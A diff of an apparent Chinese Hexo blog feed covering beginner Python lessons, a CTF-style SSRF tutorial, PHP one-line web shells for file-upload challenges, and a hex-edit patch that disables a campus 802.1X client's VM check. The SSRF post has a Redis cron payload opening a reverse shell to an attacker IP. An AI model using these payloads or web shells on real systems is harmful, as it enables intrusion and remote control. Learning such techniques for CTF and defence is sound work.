-<h4 id="比较运算符和逻辑运算符"><a href="#比较运算符和逻辑运算符" class="headerlink" title="比较运算符和逻辑运算符"></a>比较运算符和逻辑运算符</h4><p>比较运算符也称为关系运算符，包括<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&lt;=</code>、<code>&gt;=</code>，就是用来比较符号两边的关系。注意其中的<code>==</code>，这是两个等号，用来比较两者是否相等，请与赋值运算符区别。比较运算符的返回结果是一个布尔值，<code>True</code>或者<code>False</code>。</p>
-<p>逻辑运算符有三个，分别为<code>and</code>,<code>or</code>,<code>not</code>。相信学过其他语言的同学都会知道是什么意思，<code>and</code>需要两边的结果的布尔值都是<code>True</code>结果才为<code>True</code>，否则就是<code>False</code>。<code>or</code>则只需有一个布尔值为<code>True</code>结果就为<code>True</code>，否则就是<code>False</code>。而<code>not</code>则是取反，也就是说，后面的布尔值如果是<code>True</code>运算结果就是<code>False</code>，而后面的布尔值如果是<code>False</code>则运算结果就是<code>True</code>。</p>
-<p>ps：当<code>and</code>的左边布尔值为<code>False</code>，不管右边的值，将会直接返回<code>False</code>，跳过处理右边。（这叫短路处理）。同理<code>or</code>也是有短路处理的功能的，当左边为<code>True</code>时，会直接跳过右边的表达式。</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag0 = <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">flag1 = <span class="number">3</span> &gt; <span class="number">2</span></span><br><span class="line">flag2 = <span class="number">2</span> &lt; <span class="number">1</span></span><br><span class="line">flag3 = flag1 <span class="keyword">and</span> flag2</span><br><span class="line">flag4 = flag1 <span class="keyword">or</span> flag2</span><br><span class="line">flag5 = <span class="keyword">not</span> (<span class="number">1</span> != <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag0 =&#x27;</span>, flag0)    <span class="comment"># flag0 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1 =&#x27;</span>, flag1)    <span class="comment"># flag1 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2 =&#x27;</span>, flag2)    <span class="comment"># flag2 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag3 =&#x27;</span>, flag3)    <span class="comment"># flag3 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag4 =&#x27;</span>, flag4)    <span class="comment"># flag4 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag5 =&#x27;</span>, flag5)    <span class="comment"># flag5 = False</span></span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3-1-整数"><a href="#3-1-整数" class="headerlink" title="3.1 整数"></a>3.1 整数</h3><p>在Python中，可以对<strong>整数</strong>执行<strong>加减乘除</strong>的运算</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">5</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">d = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c*d)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b-d)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d/c)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241925694.png"
-                      alt="image.png"
-                ></p>
-<p>并且可以使用两个乘号<code>**</code>来表示乘方运算</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a**b)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241926264.png"
-                      alt="image.png"
-                ></p>
-<p>可以利用括来改变运算顺序</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+b*c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((a+b)*c)</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241927509.png"
-                      alt="image.png"
-                ></p>
-<p>ps：当你需要参与的整数过大时，可以采取下划线的方式，每三个分段，来让你的数更清晰易读，并且当你打印输出时，Python不会打印其中的下划线。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241943694.png"
-                      alt="image.png"
-                ></p>
-<h3 id="3-2-浮点数"><a href="#3-2-浮点数" class="headerlink" title="3.2 浮点数"></a>3.2 浮点数</h3><p>Python中浮点数就是带小数点的数，小数点可以出现在数的任何位置上，以表示任何数。<br>当你使用浮点数时，你可以不用考虑其他行为，python通常会按照你的预期的方式进行处理，所以Python是世界上最好的语言！！！（&#x2F;doge）</p>
-<p>如下图，可以看到当你把一个整数加上小数点，就变成了一个浮点数，这就是**小数点可以出现在任何位置上的原因。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241933894.png"
-                      alt="image.png"
-                ></p>
-<p>但是需要注意的是，当浮点数参与运算时，小数位数可能是不确定的，可以理解为浮点数其实是计算机给你的一个精确值，但不是绝对和运算结果相等的，可以参考下图。<br>这是所有编程语言都存在的问题，说白了这是计算机硬件处理和储存的问题，具体可参考计算机组成原理，这里不详细解释，所以计算机会忽略多余的小数位数来尽力精确的表示结果。<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241936081.png"
-                      alt="image.png"
-                ></p>
-<blockquote>
-<p>来源： 《Python编程：从入门到实践》</p>
-</blockquote>
-<p>ps：</p>
-<ul>
-<li>两个整数相除，结果也是一个浮点数，即使这两个数可以整除。</li>
-<li>在一系列运算中，若存在一个浮点数，那么结果也是浮点数。</li>
-</ul>
-<h3 id="3-3-常量"><a href="#3-3-常量" class="headerlink" title="3.3 常量"></a>3.3 常量</h3><p><strong>常量</strong>就是在程序的整个生命周期内都保持不变的变量。Python没有内置的常量类型，但是一般会使用全大写字母的变量名来指出某个变量为常量，其值应始终保持不变<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409241956461.png"
-                      alt="image.png"
-                ></p>
-<h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4. 注释"></a>4. 注释</h2><p>注释是让代码逻辑清晰的一个很有用的功能，注释是不会被程序执行的。随着程序越来越大，增加注释来对代码进行大致阐述，可以让别人看你代码时更加容易理解。</p>
-<p>编写方式：井号<code>#</code>来标识。<code>#</code>后的内容都会被Python解释器忽略<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409242000866.png"
-                      alt="image.png"
-                ><br>编写注释的主要⽬的是阐述代码要做什么，以及是如何做的。在开发项⽬ 期间，你对各个部分如何协同⼯作了如指掌，但是⼀段时间过后，你可能会忘记⼀些细节。当然，你总是可以通过研究代码来确定各个部分的⼯作 原理，但通过编写注释以清晰的⾃然语⾔对解决⽅案进⾏概述，可以节省很多时间。<br>要成为专业程序员或与其他程序员合作，就必须编写有意义的注释。当前，⼤多数软件是合作编写⽽成的，编写者既可能是同⼀家公司的多名员⼯，也可能是众多致⼒于同⼀个开源项⽬的⼈。训练有素的程序员都希望代码中包含注释，因此你最好从现在开始就在程序中添加描述性注释。新⼿程序员最值得养成的习惯之⼀就是，在代码中编写清晰、简洁的注释。 如果不确定是否要编写注释，就问问⾃⼰：在找到合理的解决⽅案之前， 考虑了多个解决⽅案吗？如果答案是肯定的，就编写注释，对你的解决⽅案进⾏说明吧。相⽐以后再回头添加注释，删除多余的注释要容易得多。 从现在开始，本书的⽰例都将使⽤注释来阐述代码的⼯作原理。</p>
-<p>如果你想写shi山代码除外，网上很多说不写注释加上乱七八糟的变量名可以增加自己的不可替代性。这边建议不如多学学高门槛的知识，来增加自己的不可代替性。</p>
-<h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>以上是Python基础入门第一课，真的很基础，后面会慢慢上升难度，作者决定跳过小问题，主要面向之后的AI学习来编写教程。有任何问题包括排版或者学习顺序的问题都可以评论或者邮箱私我。</p>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>基础</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -1259,6 +1488,140 @@
       </categories>
       <tags>
         <tag>common</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>服务器请求伪造（SSRF）</title>
+    <url>/2024/09/11/fdbfb64754f6/</url>
+    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
+<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
+<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
+<ul>
+<li>读取内网文件;</li>
+<li>扫描内网服务和端口;</li>
+<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
+<li>攻击运行在内网的系统或应用程序.</li>
+</ul>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
+<p><strong>web功能</strong></p>
+<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
+<ol>
+<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
+<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
+<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
+<li>图片加载与下载:通过URL地址加载或下载图片。</li>
+<li>通过api获取远程地址文件来加载内容。</li>
+</ol>
+<p><strong>URL关键字</strong></p>
+<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
+<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
+<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
+<p><strong>重要文件：</strong></p>
+<ol>
+<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
+<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
+<li>&#x2F;etc&#x2F;hosts:在linux中，主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开!当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。</li>
+</ol>
+<h3 id="2-探测内网服务"><a href="#2-探测内网服务" class="headerlink" title="2. 探测内网服务"></a>2. 探测内网服务</h3><p>**dict协议:**一个字典服务器协议，在ssrf中常用于探测日标服务器端口上运行的服务版本信息。格式:dict:&#x2F;&#x2F;ip:port。先利用file协议读取&#x2F;etc&#x2F;hosts获取ip，通过 dict 协议读取目标服务器端口上运行的服务版本信息</p>
+<p>探测内网存活IP和开放端口:可利用BurpSuite，批量探测存活IP和开放端口。</p>
+<ol>
+<li><p>开启Burpsuite，并访问待测试的网站:<a class="link"   href="http://120.27.61.239:8006/source/index.php" >http://120.27.61.239:8006/source/index.php <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>;</p>
+</li>
+<li><p>将抓到的包发送到Intruder模块，设置IP或者端口，进行爆破;</p>
+</li>
+</ol>
+<p><strong>探测内网redis：</strong>REmote Dlctionary Server(Redis)是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis一般绑定在本地(不允许远程访问)，默认不开启认证，默认端口为6379。如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redis以及读取Redis的数据。使用dict:&#x2F;&#x2F;127.0.0.1:6379 有返回信息，说明存在redis数据库</p>
+<p>同样可以利用Burp进行爆破</p>
+<h3 id="3-攻击内网应用"><a href="#3-攻击内网应用" class="headerlink" title="3. 攻击内网应用"></a>3. 攻击内网应用</h3><p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis 的用户是root 用户，攻击者可以通过写<strong>定时任务</strong>的方式进行反弹shell。<br>定时任务类似日常生活之中的闹钟，主要用于定时执行某些命令，达到定时处理数据的作用。不同的系统定时任务保存位置不一样，比如:<br>centos(cat &#x2F;etc&#x2F;redhat-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;日录下;<br>ubuntu(cat &#x2F;etc&#x2F;lsb-release)，在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 目录下。</p>
+<p><strong>攻击payload:</strong></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/info //查看信息</span><br><span class="line">dict://127.0.0.1:6379/flusha11 //清空数据库(慎用)</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spoo1/cron/ //设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root //设置备份文件名</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n***** bash -i &amp;&gt; /dev/tcp/攻击机IP/port 0&gt;&amp;1\n&quot;//反弹she11</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure></div>
+
+<p>然后攻击机进行监听</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvvp port</span><br></pre></td></tr></table></figure></div>
+
+<p>定时任务执行后就会反弹shell到攻击机</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传</title>
+    <url>/2024/09/11/776247657efa/</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
+    <url>/2024/09/21/7d3ba1c32839/</url>
+    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
+<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
+<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
+<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
+<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
+<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
+                      alt="image-20240921185459092"
+                ></p>
+<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
+                      alt="image-20240921185425761"
+                ></p>
+<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
+                      alt="image-20240921185659129"
+                ></p>
+<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
+                      alt="image-20240921191031242"
+                ></p>
+<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
+                      alt="image-20240921191124399"
+                ></p>
+]]></content>
+      <categories>
+        <category>common</category>
+      </categories>
+      <tags>
+        <tag>common</tag>
+        <tag>校园网</tag>
       </tags>
   </entry>
   <entry>
@@ -1412,140 +1775,6 @@
       </categories>
       <tags>
         <tag>AI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2024/09/11/776247657efa/</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>一句话木马</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解决JNU某捷有线校园网关闭虚拟机网络服务</title>
-    <url>/2024/09/21/7d3ba1c32839/</url>
-    <content><![CDATA[<p><em><strong>免责声明：本文只作JNU锐捷校园网认证的经验分享，其他学校的校园网是否适用请自行尝试，所有后果与作者无关！</strong></em></p>
-<p><strong>注意：此方法只适用于虚拟机网络使用NAT连接。</strong></p>
-<p>首先我们先要知道为什么校园网会自动关闭虚拟机的NAT网络，说白了就是扫你服务是否开启，如果你的NAT服务开启，他就给你关闭。所以我们解决这个问题就要找到他的扫描在哪里。</p>
-<p>首先先按照以下方法来操作，你最后就会知道原理。先卸载你之前的校园网，并且把文件夹里的文件删除干净。</p>
-<p>首先需要做好准备，下载一个可以查看字节的软件，比如010editor、PEview、UltraEdit等。这里我们采用UltraEdit。相关软件请自行搜索下载。</p>
-<p>然后下载校园网认证的<a href="">安装包</a>进行安装。选择安装路径。然后点击立即安装。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211845185.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854110.png"
-                      alt="image-20240921185459092"
-                ></p>
-<h4 id="注意：这里安装完成后不要点击完成安装！！！！"><a href="#注意：这里安装完成后不要点击完成安装！！！！" class="headerlink" title="注意：这里安装完成后不要点击完成安装！！！！"></a>注意：这里安装完成后不要点击完成安装！！！！</h4><p>然后我们打开校园网安装路径的根目录，找到8021x.exe，这个exe文件其实就是扫描你的服务的，当你认证了校园网后，这个服务也会在后台运行，并且这个程序是关不了的，关了你的校园网也没了，所以很ex。。并且当你完成安装后，这个exe文件也就绑定了，无法更改（更改后会自动还原）。但是你没有点完成安装，这个文件就是可修改的。这就是原理。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211854775.png"
-                      alt="image-20240921185425761"
-                ></p>
-<p>然后我们打开UltraEdit，把这个文件拖入到UltraEdit。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211856159.png"
-                      alt="image-20240921185659129"
-                ></p>
-<p>然后按住键盘的ctrl+f，进行搜索：<code>VMware NAT Service</code>，然后这里把这个字节改了就行，随便改，这里我把<code>VMware</code>改成了<code>VWware</code>。然后更改完成后按ctrl+s进行保存，这里就完成了，关闭UltraEdit。然后点击完成安装.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211910081.png"
-                      alt="image-20240921191031242"
-                ></p>
-<p>这里就完成了，登陆校园网后，按住ctrl+shift+esc，打开任务管理器，点开服务，搜索NAT，然后右键启动VMware NAT Service，就会发现，这个服务不会被自动关闭了，虚拟机就可以正常上网了。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211911440.png"
-                      alt="image-20240921191124399"
-                ></p>
-]]></content>
-      <categories>
-        <category>common</category>
-      </categories>
-      <tags>
-        <tag>common</tag>
-        <tag>校园网</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>服务器请求伪造（SSRF）</title>
-    <url>/2024/09/11/fdbfb64754f6/</url>
-    <content><![CDATA[<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>服务器请求</strong>是从客户端发起一个请求到服务器，服务器再向另外的服务器发起请求的过程。</p>
-<p><strong>服务器端清求伪造</strong>(Server-side Request Forgery，简称SSRF)，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。SSRF让服务器去请求你通常请求不到的东西，一般用来在外网探测或攻击内网服务。	 </p>
-<p>**类比CSRF:**服务器端请求伪造攻击将域中的不安全服务器作为代理使用，这与利用网页客户端的跨站请求伪造攻击类似(如处在域中的浏览器可作为攻击者的代理)。<br>**漏洞成因:**由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发送请求，并返回对该目标地址请求的数据。比如:攻击者传入一个未经验证的 URL，后端代码直接请求这个URL，就会造成 SSRF 漏洞。<br>**漏洞危害:**利用SSRF漏洞，攻击者实际上可以访问内网，可以进行</p>
-<ul>
-<li>读取内网文件;</li>
-<li>扫描内网服务和端口;</li>
-<li>收集内网 web 应用的指纹识别，根据这些信息进行下一步的渗透:</li>
-<li>攻击运行在内网的系统或应用程序.</li>
-</ul>
-<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>漏洞点：</strong>能够对外发起网络请求的服务器，就可能存在SSRF漏洞</p>
-<p><strong>web功能</strong></p>
-<p>服务器端请求伪造漏洞是在服务端获取其他服务器的相关信息的功能中形成的，因此我们可以列举几种在web应用中常见的从服务端获取其他服务器信息的的功能:</p>
-<ol>
-<li>分享URL:通过目标URL地址获取了title标签和相关文本内容，而如果在此功能中没有对目标地址的范围做过滤与限制则就存在着SSRF漏洞。</li>
-<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览。</li>
-<li>在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</li>
-<li>图片加载与下载:通过URL地址加载或下载图片。</li>
-<li>通过api获取远程地址文件来加载内容。</li>
-</ol>
-<p><strong>URL关键字</strong></p>
-<p>寻找需要加载外部资源的URL，可能存在SSRF漏洞。这些URL中经常包含的关键词有<code>share、wap、ur1、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</code>等利用 google 语法(inurl:url&#x3D;)加上这些关键字去寻找 SSRF 漏洞，耐心的验证，可以找到存在的 SSRF漏洞。</p>
-<p><strong>判断漏洞是否存在：</strong>在目标网站上攻击者IP，如果攻击的服务器日志能看到目标服务器对自己发起的请求，说明存在漏洞。</p>
-<h2 id="SSRF利用"><a href="#SSRF利用" class="headerlink" title="SSRF利用"></a>SSRF利用</h2><h3 id="1-读取敏感文件"><a href="#1-读取敏感文件" class="headerlink" title="1. 读取敏感文件"></a>1. 读取敏感文件</h3><p>**file协议:**本地文件传输协议，用于访问本地计算机中的文件。好比通过Windows的资源管理器中打开文件或者通过右键单击打开一样。格式:file:&#x2F;&#x2F;filepath</p>
-<p><strong>重要文件：</strong></p>
-<ol>
-<li>&#x2F;etc&#x2F;passwd:在Linux中，&#x2F;etc&#x2F;passwd文件中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段:<code>用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录 shell</code></li>
-<li>&#x2F;etc&#x2F;shadow:用于存储 Linux 系统中用户的密码信息，只有 root 用户拥有读权限，其他用户没有任何权限。</li>
